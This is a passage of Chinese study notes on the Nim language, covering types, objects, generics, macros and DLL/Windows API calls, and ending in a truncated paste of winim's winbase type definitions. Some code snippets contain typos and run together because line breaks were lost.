array1:MyTwoDArray = [[1, 2], [3, 4], [5, 6]]输出一下echo array1[1][1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义序列类型seq"><a href="#type定义序列类型seq" class="headerlink" title="type定义序列类型seq"></a>type定义序列类型seq</h2><pre class="line-numbers language-none"><code class="language-none">type MySeq = seq[int]只有类型  没有长度var seq1:MySeq = @[1, 2, 3]seq1.add= 5echo seq1初始化一个空的序列var seq2:MySeq = newSeq[int](3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>openArray 用在函数体内</p><h2 id="接收一个不定长度的数组"><a href="#接收一个不定长度的数组" class="headerlink" title="接收一个不定长度的数组"></a>接收一个不定长度的数组</h2><pre class="line-numbers language-none"><code class="language-none">proc myfunc(arr:openArray[string]) = discard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="变长数组varargs"><a href="#变长数组varargs" class="headerlink" title="变长数组varargs"></a>变长数组varargs</h2><pre class="line-numbers language-none"><code class="language-none">proc myfunc1(fmt:string, arr:varargs[string, `$`]) = for s in arr:echo s第二个参数是一个加长数组 那么后面就可以任意加长了$是先将传入的东西 转换为string调用一下函数myfunc1("hello", "json", "java", 10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义切片类型slice"><a href="#type定义切片类型slice" class="headerlink" title="type定义切片类型slice"></a>type定义切片类型slice</h2><pre class="line-numbers language-none"><code class="language-none">var c:Slice[int]c.a = 0c.b = 1var str = "hello world "echo str[xx]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义元组类型tuple"><a href="#type定义元组类型tuple" class="headerlink" title="type定义元组类型tuple"></a>type定义元组类型tuple</h2><pre class="line-numbers language-none"><code class="language-none">type  MyTuple = tuple[name:string, age:int] 还可以这样写typeMyTuple = tuplename:stringage:int  var d:MyTuple = (name:"张三", age:18) echo d  只输出其中的一个值 echo d.name  也可以不写键名 var f:MyTuple = ("张三, 18) echo f.name  元组 tuple判断相等 键 名 顺序 三者都要相等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ref是一个引用类型"><a href="#ref是一个引用类型" class="headerlink" title="ref是一个引用类型"></a>ref是一个引用类型</h2><p>引用类型会被放到<strong>堆</strong>里面</p><p>受垃圾回收管理,会回收内存</p><h2 id="ptr是一个指针类型"><a href="#ptr是一个指针类型" class="headerlink" title="ptr是一个指针类型"></a>ptr是一个指针类型</h2><p>ptr不受垃圾回收管理,自己释放，自己回收</p><h2 id="type定义对象类型"><a href="#type定义对象类型" class="headerlink" title="type定义对象类型"></a>type定义对象类型</h2><p>RootObj所有对象类型的父类型</p><pre class="line-numbers language-none"><code class="language-none">typePerson = ref object of RootObjname:stringage:int继承typePerson = ref object of RootObjname:stringage:intStudent = ref object of Personid:intvar p = Person(name:"张三", age:18)echo p.name或者这么写把对象写成可继承的typePerson {.inheritable.} = ref objectname:stringage:int用一下继承 的Studentvar s = Student(name:"李四", age:21, id:12)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><pre class="line-numbers language-none"><code class="language-none">var s = Student(name:"李四", age:21, id:12)var p1:Person = secho p1.namevar p1 = new Person()p1.name = "王五"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>cast[]</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>不跟类进行绑定</p><pre class="line-numbers language-none"><code class="language-none">proc getName(this:Person):string = this.namep.getName() proc Age(this:Person):<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义泛型类-T"><a href="#type定义泛型类-T" class="headerlink" title="type定义泛型类 T"></a>type定义泛型类 T</h2><pre class="line-numbers language-none"><code class="language-none">type Animal[T] = objectkind:Tname:string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><pre class="line-numbers language-none"><code class="language-none">proc myfunc[T](a:T) = echo a, "-", type(T)判断是什么类型proc myfunc[T](a:T) = echo a, "-", type(T)if(a is string):echo "string"elif(a is int):echo "int"else:echo type(a) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><pre class="line-numbers language-none"><code class="language-none">try:***except OverflowError, IOError:***except:***finally:***<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写一个dll"><a href="#写一个dll" class="headerlink" title="写一个dll"></a>写一个dll</h2><p>带<code>*</code>表明它是要导出的</p><p>在模块中 带<code>*</code>表示在一个模块中 可以使用另一个模块</p><pre class="line-numbers language-none"><code class="language-none">stdcall 参数从右向左压栈由被调用者清理栈用在32位的系统中proc linkStr*(x:varargs[string]):string {.stdcall.}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">fastcall前四个参数 会被放到四个寄存器里分别是2cx 2dx 28 29多余的参数 才会按照从右向左压栈用在64位的系统中proc linkStr*(x:varargs[string]):string {.fastcall.}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c语言的调用的约定:cdecl参数从右向左压栈由调用者清理栈proc linkStr*(x:varargs[string]):string {.cdecl.}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nim的调用约定:nimcall64位的相当于fastcall指定导出格式c的导出格式:exportcc++的导出格式:exportc++dynlib:动态库win:dlllinux:.so文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写一个dll-1"><a href="#写一个dll-1" class="headerlink" title="写一个dll"></a>写一个dll</h2><pre class="line-numbers language-none"><code class="language-none">mynim.dllproc linkStr*(x:varargs[string]):string {.nimcall.dynlib.} = result = ""for subs in x:result = result &amp; subs这时候的编译选项:需要指定libnim cc -d=release -o=bin/mynim.dll --app:lib mynim.nim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NimMain</p><p>是由nim自己添加的</p><pre class="line-numbers language-none"><code class="language-none">自己写proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="静态调用这个dll"><a href="#静态调用这个dll" class="headerlink" title="静态调用这个dll"></a>静态调用这个dll</h2><p>重新写一个nim</p><p>calldll.nim</p><pre class="line-numbers language-none"><code class="language-none">proc myLinkStr(x:varargs[string]):string {.nimcall, importc:"linkStr", dynlib:"mynim.dll".}echo myLinkStr "hello world"编译nim cc -d=release -o=bin/mynim.exe -r calldll.nim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="动态调用dll"><a href="#动态调用dll" class="headerlink" title="动态调用dll"></a>动态调用dll</h2><pre class="line-numbers language-none"><code class="language-none">import dynlibtypelinkStrType = proc(x:varargs[string]):string {.nimcall.}let lib = loadLib("mynim.dll") #加载dllif lib != nil:let linkStrAddr = lib.symAddr("linkStr") #获取地址if linkStrAddr != nil:let linkStr = cast[linkStrType](linkStrAddr) #类型转换echo linkStr "hi"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows-api调用"><a href="#windows-api调用" class="headerlink" title="windows api调用"></a>windows api调用</h2><pre class="line-numbers language-none"><code class="language-none">import dyblibtypeHANDLE = intHWND = HANDLEUINT = uintLPCSTR = cstringproc MessageBox(hwnd:HWND, lpText:LPCSTR, lpCap:LPCSTR, uType:UINT):UINT {.discardable, fastcall, dynlib:"user32", importc:"MessageBoxA".}MessageBox(0, "hello world", "Message", 0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="winim"><a href="#winim" class="headerlink" title="winim"></a>winim</h2><p>安装</p><pre class="line-numbers language-none"><code class="language-none">nimble install winim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import winim/leanMessageBox(0, "hello world", "Message", 0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\Desktop\1.assets\image-20210927103751512.png" alt="image-20210927103751512"></p><h2 id="自己写一个dll"><a href="#自己写一个dll" class="headerlink" title="自己写一个dll"></a>自己写一个dll</h2><pre class="line-numbers language-none"><code class="language-none">不用winim包的话首先是要自己写一下这个proc NimMain(){.cdecl, importc.}typeHANDLE = intDWORD = int32HINSTANCE = HANDLEBOOL = boolconst DLL_PROCESS_ATTACH = 1proc DllMain(hinst:HINSTANSE, reason:DWORD, lpreversed:DWORD):BOOL{.nimcall, exportc, dynlib.} =NimMain() #手动调用一下if reason == DLL_PROCESS_ATTACH:MessageBox(0, "helloworld", "Message", 0)return ture编译的时候nim cc -d=release -o=bin/mynim.dll -app:lib --nomain mynim.nim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>把一个快放入另外一个nim文件中 </p><p>比如是mod.nim</p><p>要加一个* 表示可以被导出</p><pre class="line-numbers language-none"><code class="language-none">const DLL_PROCESS_ATTACH* = 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么调用如下</p><pre class="line-numbers language-none"><code class="language-none">import modfrom mod import DLL_PROCESS_ATTACHimport mod except DLL_PROCESS_ATTACH强制mod前缀from mod import nil强制mod前缀并且使用别名mfrom mod as m import nil<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>include 包含文件</p><p>export </p><p>项目学习</p><p><img src="C:\Users\12550\Desktop\1.assets\image-20210927110249710.png" alt="image-20210927110249710"></p><p><img src="C:\Users\12550\Desktop\1.assets\image-20210927110324478.png" alt="image-20210927110324478"></p><h2 id="宏实参"><a href="#宏实参" class="headerlink" title="宏实参"></a>宏实参</h2><p>宏的实参有两面性。一面用来重载解析，另一面在宏体内使用</p><p>有两种给宏传递实参的方式，实参必须是 <code>typed</code> 或 <code>untyped</code> 中的一种。</p><h2 id="无类型（untyped）实参"><a href="#无类型（untyped）实参" class="headerlink" title="无类型（untyped）实参"></a>无类型（untyped）实参</h2><p>无类型宏实参在语义检查前传递给宏</p><p>无类型实参的优点是语法树可以预知，也比 <code>typed</code> 简单</p><p><code>untyped</code> 实参的缺点是对重载解析不利。</p><h2 id="类型化（typed）实参"><a href="#类型化（typed）实参" class="headerlink" title="类型化（typed）实参"></a>类型化（typed）实参</h2><p>对于类型化实参，语义检查器在它传给宏之前对其进行检查并进行变换。这里标识符节点解析成符号， 树中的隐式类型转换被看作调用，模板被展开，最重要的是节点有类型信息。类型化实参的实参列表可以有 <code>typed</code> 类型。 但是其它所有类型，例如 <code>int</code>, <code>float</code> 或 <code>MyObjectType</code> 也是类型化实参，它们作为一个语法树传递给宏。</p><h2 id="静态实参"><a href="#静态实参" class="headerlink" title="静态实参"></a>静态实参</h2><p>静态实参是向宏传递值而不是语法树的方法。例如对于 <code>macro foo(arg: static[int])</code> 来说， <code>foo(x)</code> 表达式中的 <code>x</code> 需要是整型常量， 但在宏体中 <code>arg</code> 只是一个普通的 <code>int</code> 类型。</p><pre class="line-numbers language-none"><code class="language-none">import macros macro myMacro(arg: static[int]): untyped =  echo arg # 只是int (7), 不是 ``NimNode`` myMacro(1 + 2 * 3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码块实参"><a href="#代码块实参" class="headerlink" title="代码块实参"></a>代码块实参</h2><p>可以在具有缩进的单独代码块中传递调用表达式的最后一个参数。 例如下面的代码示例是合法的（不推荐的）调用 <code>echo</code> 的方法：</p><pre class="line-numbers language-none"><code class="language-none">echo "Hello ":  let a = "Wor"  let b = "ld!"  a &amp; b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>对于宏来说这样的调用很有用；任意复杂度的语法树可以用这种标记传给宏。</p><h2 id="语法树"><a href="#语法树" class="headerlink" title="语法树"></a>语法树</h2><p>为了构建Nim语法树，我们需要知道如何用语法树表示Nim源码， 能被Nim编译器理解的树看起来是什么样子的。 Nim语法树节点记载在 <a href="https://nim-lang-cn.org/docs/macros.html">macros</a> 模块。 一个更加互动性的学习Nim语法树的方法是用 <code>macros.treeRepr</code> ，它把语法树转换成一个多行字符串打印到控制台。 它也可以用来探索实参表达式如何用树的形式表示， 以及生成的语法树的调试打印。 <code>dumpTree</code> 是一个预定义的宏，以树的形式打印它的实参。树表示的示例：</p><pre class="line-numbers language-none"><code class="language-none">import macrosdumpTree:    var mt:MyType = MyType(a:123, b:"abc")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-none"><code class="language-none">StmtList  VarSection    IdentDefs      Ident "mt"      Ident "MyType"      ObjConstr        Ident "MyType"        ExprColonExpr          Ident "a"          IntLit 123        ExprColonExpr          Ident "b"          StrLit "abc"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义语义检查"><a href="#自定义语义检查" class="headerlink" title="自定义语义检查"></a>自定义语义检查</h2><p>宏对实参做的第一件事是检查实参是否是正确的形式。不是每种类型的错误输入都需要在这里捕获</p><p>但是应该捕获在宏求值期间可能导致崩溃的任何内容并创建一个很好的错误消息</p><p> <code>macros.expectKind</code> 和 <code>macros.expectLen</code> </p><p>通用<code>macros.error</code> 过程创建。</p><pre class="line-numbers language-none"><code class="language-none">macro myAssert(arg: untyped): untyped =  arg.expectKind nnkInfix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h2><p>一:</p><p>多个 <code>newTree</code> 和 <code>newLit</code> 调用的表达式创建语法树,为语法树生成提供最好的底层控制</p><p>二:</p><p><code>quote do:</code> 表达式</p><p>如果你选择用 <code>newTree</code> 和 <code>newLit</code> 创建语法树， 使用<code>marcos.dumpAstGen</code> 宏</p><p><code>quote do:</code> 允许你直接写希望生成的代码，反引号用来插入来自 <code>NimNode</code> 符号的代码到生成的表达式中。 这表示你无法在 <code>quote do:</code> 使用反引号做除了注入符号之外的事情。确保只注入 <code>NimNode</code> 类型的符号到生成的语法树中。 你可以使用 <code>newLit</code> 把任意值转换成 <code>NimNode</code> 表达式树类型， 以便安全地注入到树中。</p><h2 id="构建宏"><a href="#构建宏" class="headerlink" title="构建宏"></a>构建宏</h2><p>winim</p><p>调用</p><pre class="line-numbers language-none"><code class="language-none">#====================================================================##               Winim - Nim's Windows API Module#                 (c) Copyright 2016-2021 Ward##====================================================================import winimbaseimport windef#include &lt;winbase.h&gt;#include &lt;minwinbase.h&gt;#include &lt;bemapiset.h&gt;#include &lt;debugapi.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;fibersapi.h&gt;#include &lt;fileapi.h&gt;#include &lt;handleapi.h&gt;#include &lt;heapapi.h&gt;#include &lt;ioapiset.h&gt;#include &lt;interlockedapi.h&gt;#include &lt;jobapi.h&gt;#include &lt;libloaderapi.h&gt;#include &lt;memoryapi.h&gt;#include &lt;namedpipeapi.h&gt;#include &lt;namespaceapi.h&gt;#include &lt;processenv.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;processtopologyapi.h&gt;#include &lt;profileapi.h&gt;#include &lt;realtimeapiset.h&gt;#include &lt;securityappcontainer.h&gt;#include &lt;securitybaseapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;sysinfoapi.h&gt;#include &lt;systemtopologyapi.h&gt;#include &lt;threadpoolapiset.h&gt;#include &lt;threadpoollegacyapiset.h&gt;#include &lt;utilapiset.h&gt;#include &lt;wow64apiset.h&gt;#include &lt;timezoneapi.h&gt;type  FINDEX_INFO_LEVELS* = int32  FINDEX_SEARCH_OPS* = int32  GET_FILEEX_INFO_LEVELS* = int32  FILE_INFO_BY_HANDLE_CLASS* = int32  PFILE_INFO_BY_HANDLE_CLASS* = ptr int32  MEMORY_RESOURCE_NOTIFICATION_TYPE* = int32  OFFER_PRIORITY* = int32  COMPUTER_NAME_FORMAT* = int32  THREAD_INFORMATION_CLASS* = int32  PROCESS_INFORMATION_CLASS* = int32  DEP_SYSTEM_POLICY_TYPE* = int32  PROC_THREAD_ATTRIBUTE_NUM* = int32  COPYFILE2_MESSAGE_TYPE* = int32  COPYFILE2_MESSAGE_ACTION* = int32  COPYFILE2_COPY_PHASE* = int32  STREAM_INFO_LEVELS* = int32  PRIORITY_HINT* = int32  FILE_ID_TYPE* = int32  PFILE_ID_TYPE* = ptr int32  BAD_MEMORY_CALLBACK_ROUTINE* = pointer  DLL_DIRECTORY_COOKIE* = PVOID  PDLL_DIRECTORY_COOKIE* = ptr PVOID  OPERATION_ID* = ULONG  SECURITY_ATTRIBUTES* {.pure.} = object    nLength*: DWORD    lpSecurityDescriptor*: LPVOID    bInheritHandle*: WINBOOL  PSECURITY_ATTRIBUTES* = ptr SECURITY_ATTRIBUTES  LPSECURITY_ATTRIBUTES* = ptr SECURITY_ATTRIBUTES  OVERLAPPED_UNION1_STRUCT1* {.pure.} = object    Offset*: DWORD    OffsetHigh*: DWORD  OVERLAPPED_UNION1* {.pure, union.} = object    struct1*: OVERLAPPED_UNION1_STRUCT1    Pointer*: PVOID  OVERLAPPED* {.pure.} = object    Internal*: ULONG_PTR    InternalHigh*: ULONG_PTR    union1*: OVERLAPPED_UNION1    hEvent*: HANDLE  LPOVERLAPPED* = ptr OVERLAPPED  OVERLAPPED_ENTRY* {.pure.} = object    lpCompletionKey*: ULONG_PTR    lpOverlapped*: LPOVERLAPPED    Internal*: ULONG_PTR    dwNumberOfBytesTransferred*: DWORD  LPOVERLAPPED_ENTRY* = ptr OVERLAPPED_ENTRY  SYSTEMTIME* {.pure.} = object    wYear*: WORD    wMonth*: WORD    wDayOfWeek*: WORD    wDay*: WORD    wHour*: WORD    wMinute*: WORD    wSecond*: WORD    wMilliseconds*: WORD  PSYSTEMTIME* = ptr SYSTEMTIME  LPSYSTEMTIME* = ptr SYSTEMTIME  WIN32_FIND_DATAA* {.pure.} = object    dwFileAttributes*: DWORD    ftCreationTime*: FILETIME    ftLastAccessTime*: FILETIME    ftLastWriteTime*: FILETIME    nFileSizeHigh*: DWORD    nFileSizeLow*: DWORD    dwReserved0*: DWORD    dwReserved1*: DWORD    cFileName*: array[MAX_PATH, CHAR]    cAlternateFileName*: array[14, CHAR]  PWIN32_FIND_DATAA* = ptr WIN32_FIND_DATAA  LPWIN32_FIND_DATAA* = ptr WIN32_FIND_DATAA  WIN32_FIND_DATAW* {.pure.} = object    dwFileAttributes*: DWORD    ftCreationTime*: FILETIME    ftLastAccessTime*: FILETIME    ftLastWriteTime*: FILETIME    nFileSizeHigh*: DWORD    nFileSizeLow*: DWORD    dwReserved0*: DWORD    dwReserved1*: DWORD    cFileName*: array[MAX_PATH, WCHAR]    cAlternateFileName*: array[14, WCHAR]  PWIN32_FIND_DATAW* = ptr WIN32_FIND_DATAW  LPWIN32_FIND_DATAW* = ptr WIN32_FIND_DATAW  CRITICAL_SECTION* = RTL_CRITICAL_SECTION  PCRITICAL_SECTION* = PRTL_CRITICAL_SECTION  LPCRITICAL_SECTION* = PRTL_CRITICAL_SECTION  CRITICAL_SECTION_DEBUG* = RTL_CRITICAL_SECTION_DEBUG  PCRITICAL_SECTION_DEBUG* = PRTL_CRITICAL_SECTION_DEBUG  LPCRITICAL_SECTION_DEBUG* = PRTL_CRITICAL_SECTION_DEBUG  PROCESS_HEAP_ENTRY_UNION1_Block* {.pure.} = object    hMem*: HANDLE    dwReserved*: array[3, DWORD]  PROCESS_HEAP_ENTRY_UNION1_Region* {.pure.} = object    dwCommittedSize*: DWORD    dwUnCommittedSize*: DWORD    lpFirstBlock*: LPVOID    lpLastBlock*: LPVOID  PROCESS_HEAP_ENTRY_UNION1* {.pure, union.} = object    Block*: PROCESS_HEAP_ENTRY_UNION1_Block    Region*: PROCESS_HEAP_ENTRY_UNION1_Region  PROCESS_HEAP_ENTRY* {.pure.} = object    lpData*: PVOID    cbData*: DWORD    cbOverhead*: BYTE    iRegionIndex*: BYTE    wFlags*: WORD    union1*: PROCESS_HEAP_ENTRY_UNION1  LPPROCESS_HEAP_ENTRY* = ptr PROCESS_HEAP_ENTRY  PPROCESS_HEAP_ENTRY* = ptr PROCESS_HEAP_ENTRY  REASON_CONTEXT_Reason_Detailed* {.pure.} = object    LocalizedReasonModule*: HMODULE    LocalizedReasonId*: ULONG    ReasonStringCount*: ULONG    ReasonStrings*: ptr LPWSTR  REASON_CONTEXT_Reason* {.pure, union.} = object    Detailed*: REASON_CONTEXT_Reason_Detailed    SimpleReasonString*: LPWSTR  REASON_CONTEXT* {.pure.} = object    Version*: ULONG    Flags*: DWORD    Reason*: REASON_CONTEXT_Reason  PREASON_CONTEXT* = ptr REASON_CONTEXT  PTHREAD_START_ROUTINE* = proc (lpThreadParameter: LPVOID): DWORD {.stdcall.}  LPTHREAD_START_ROUTINE* = PTHREAD_START_ROUTINE  EXCEPTION_DEBUG_INFO* {.pure.} = object    ExceptionRecord*: EXCEPTION_RECORD    dwFirstChance*: DWORD  LPEXCEPTION_DEBUG_INFO* = ptr EXCEPTION_DEBUG_INFO  CREATE_THREAD_DEBUG_INFO* {.pure.} = object    hThread*: HANDLE    lpThreadLocalBase*: LPVOID    lpStartAddress*: LPTHREAD_START_ROUTINE  LPCREATE_THREAD_DEBUG_INFO* = ptr CREATE_THREAD_DEBUG_INFO  CREATE_PROCESS_DEBUG_INFO* {.pure.} = object    hFile*: HANDLE    hProcess*: HANDLE    hThread*: HANDLE    lpBaseOfImage*: LPVOID    dwDebugInfoFileOffset*: DWORD    nDebugInfoSize*: DWORD    lpThreadLocalBase*: LPVOID    lpStartAddress*: LPTHREAD_START_ROUTINE    lpImageName*: LPVOID    fUnicode*: WORD  LPCREATE_PROCESS_DEBUG_INFO* = ptr CREATE_PROCESS_DEBUG_INFO  EXIT_THREAD_DEBUG_INFO* {.pure.} = object    dwExitCode*: DWORD  LPEXIT_THREAD_DEBUG_INFO* = ptr EXIT_THREAD_DEBUG_INFO  EXIT_PROCESS_DEBUG_INFO* {.pure.} = object    dwExitCode*: DWORD  LPEXIT_PROCESS_DEBUG_INFO* = ptr EXIT_PROCESS_DEBUG_INFO  LOAD_DLL_DEBUG_INFO* {.pure.} = object    hFile*: HANDLE    lpBaseOfDll*: LPVOID    dwDebugInfoFileOffset*: DWORD    nDebugInfoSize*: DWORD    lpImageName*: LPVOID    fUnicode*: WORD  LPLOAD_DLL_DEBUG_INFO* = ptr LOAD_DLL_DEBUG_INFO  UNLOAD_DLL_DEBUG_INFO* {.pure.} = object    lpBaseOfDll*: LPVOID  LPUNLOAD_DLL_DEBUG_INFO* = ptr UNLOAD_DLL_DEBUG_INFO  OUTPUT_DEBUG_STRING_INFO* {.pure.} = object    lpDebugStringData*: LPSTR    fUnicode*: WORD    nDebugStringLength*: WORD  LPOUTPUT_DEBUG_STRING_INFO* = ptr OUTPUT_DEBUG_STRING_INFO  RIP_INFO* {.pure.} = object    dwError*: DWORD    dwType*: DWORD  LPRIP_INFO* = ptr RIP_INFO  DEBUG_EVENT_u* {.pure, union.} = object    Exception*: EXCEPTION_DEBUG_INFO    CreateThread*: CREATE_THREAD_DEBUG_INFO    CreateProcessInfo*: CREATE_PROCESS_DEBUG_INFO    ExitThread*: EXIT_THREAD_DEBUG_INFO    ExitProcess*: EXIT_PROCESS_DEBUG_INFO    LoadDll*: LOAD_DLL_DEBUG_INFO    UnloadDll*: UNLOAD_DLL_DEBUG_INFO    DebugString*: OUTPUT_DEBUG_STRING_INFO    RipInfo*: RIP_INFO  DEBUG_EVENT* {.pure.} = object    dwDebugEventCode*: DWORD    dwProcessId*: DWORD    dwThreadId*: DWORD    u*: DEBUG_EVENT_u  LPDEBUG_EVENT* = ptr DEBUG_EVENT  LPCONTEXT* = PCONTEXT  PTOP_LEVEL_EXCEPTION_FILTER* = proc (ExceptionInfo: ptr EXCEPTION_POINTERS): LONG {.stdcall.}  LPTOP_LEVEL_EXCEPTION_FILTER* = PTOP_LEVEL_EXCEPTION_FILTER  BY_HANDLE_FILE_INFORMATION* {.pure.} = object    dwFileAttributes*: DWORD    ftCreationTime*: FILETIME    ftLastAccessTime*: FILETIME    ftLastWriteTime*: FILETIME    dwVolumeSerialNumber*: DWORD    nFileSizeHigh*: DWORD    nFileSizeLow*: DWORD    nNumberOfLinks*: DWORD    nFileIndexHigh*: DWORD    nFileIndexLow*: DWORD  PBY_HANDLE_FILE_INFORMATION* = ptr BY_HANDLE_FILE_INFORMATION  LPBY_HANDLE_FILE_INFORMATION* = ptr BY_HANDLE_FILE_INFORMATION  WIN32_FILE_ATTRIBUTE_DATA* {.pure.} = object    dwFileAttributes*: DWORD    ftCreationTime*: FILETIME    ftLastAccessTime*: FILETIME    ftLastWriteTime*: FILETIME    nFileSizeHigh*: DWORD    nFileSizeLow*: DWORD  LPWIN32_FILE_ATTRIBUTE_DATA* = ptr WIN32_FILE_ATTRIBUTE_DATA  CREATEFILE2_EXTENDED_PARAMETERS* {.pure.} = object    dwSize*: DWORD    dwFileAttributes*: DWORD    dwFileFlags*: DWORD    dwSecurityQosFlags*: DWORD    lpSecurityAttributes*: LPSECURITY_ATTRIBUTES    hTemplateFile*: HANDLE  PCREATEFILE2_EXTENDED_PARAMETERS* = ptr CREATEFILE2_EXTENDED_PARAMETERS  LPCREATEFILE2_EXTENDED_PARAMETERS* = ptr CREATEFILE2_EXTENDED_PARAMETERS  THEAP_SUMMARY* {.pure.} = object    cb*: DWORD    cbAllocated*: SIZE_T    cbCommitted*: SIZE_T    cbReserved*: SIZE_T    cbMaxReserve*: SIZE_T  PHEAP_SUMMARY* = ptr THEAP_SUMMARY  LPHEAP_SUMMARY* = PHEAP_SUMMARY  ENUMUILANG* {.pure.} = object    NumOfEnumUILang*: ULONG    SizeOfEnumUIBuffer*: ULONG    pEnumUIBuffer*: ptr LANGID  PENUMUILANG* = ptr ENUMUILANG  WIN32_MEMORY_RANGE_ENTRY* {.pure.} = object    VirtualAddress*: PVOID    NumberOfBytes*: SIZE_T  PWIN32_MEMORY_RANGE_ENTRY* = ptr WIN32_MEMORY_RANGE_ENTRY  PROCESS_INFORMATION* {.pure.} = object    hProcess*: HANDLE    hThread*: HANDLE    dwProcessId*: DWORD    dwThreadId*: DWORD  PPROCESS_INFORMATION* = ptr PROCESS_INFORMATION  LPPROCESS_INFORMATION* = ptr PROCESS_INFORMATION  STARTUPINFOA* {.pure.} = object    cb*: DWORD    lpReserved*: LPSTR    lpDesktop*: LPSTR    lpTitle*: LPSTR    dwX*: DWORD    dwY*: DWORD    dwXSize*: DWORD    dwYSize*: DWORD    dwXCountChars*: DWORD    dwYCountChars*: DWORD    dwFillAttribute*: DWORD    dwFlags*: DWORD    wShowWindow*: WORD    cbReserved2*: WORD    lpReserved2*: LPBYTE    hStdInput*: HANDLE    hStdOutput*: HANDLE    hStdError*: HANDLE  LPSTARTUPINFOA* = ptr STARTUPINFOA  STARTUPINFOW* {.pure.} = object    cb*: DWORD    lpReserved*: LPWSTR    lpDesktop*: LPWSTR    lpTitle*: LPWSTR    dwX*: DWORD    dwY*: DWORD    dwXSize*: DWORD    dwYSize*: DWORD    dwXCountChars*: DWORD    dwYCountChars*: DWORD    dwFillAttribute*: DWORD    dwFlags*: DWORD    wShowWindow*: WORD    cbReserved2*: WORD    lpReserved2*: LPBYTE    hStdInput*: HANDLE    hStdOutput*: HANDLE    hStdError*: HANDLE  LPSTARTUPINFOW* = ptr STARTUPINFOW  PROC_THREAD_ATTRIBUTE_LIST* {.pure.} = object  PPROC_THREAD_ATTRIBUTE_LIST* = ptr PROC_THREAD_ATTRIBUTE_LIST  LPPROC_THREAD_ATTRIBUTE_LIST* = ptr 